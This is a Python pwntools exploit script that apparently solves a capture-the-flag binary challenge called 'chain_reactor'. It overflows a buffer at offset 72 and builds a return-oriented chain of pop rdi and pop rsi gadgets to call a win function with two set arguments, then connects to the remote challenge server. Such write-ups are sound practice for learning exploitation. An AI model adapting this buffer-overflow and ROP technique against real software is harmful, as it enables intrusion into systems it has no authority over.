#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chain_reactor', checksec=False)

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13582)
# we need to pass to the win function two arguments, so we have to find pop rdi and pop rsi gadgets

# the two expected arguments are: 0xc0ffee and 0xbadc0de. inside the main, there is ULL at the end of the addresses
# to tell the compiler that they are 64 bit numbers, but we can ignore it and just use the hex values as they are, 
# since the upper bits will be filled with zeros anyway

OFFSET_TO_RIP = 72

pop_rdi = 0x000000000040121f
pop_rsi = 0x0000000000401221
ret_gadget = 0x000000000040101a
win_address = elf.sym.win

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi),
    p64(0xc0ffee),
    p64(pop_rsi),
    p64(0xbadc0de),
    p64(win_address),
)

p.recvuntil(b'codes:')

p.send(payload)

p.interactive()
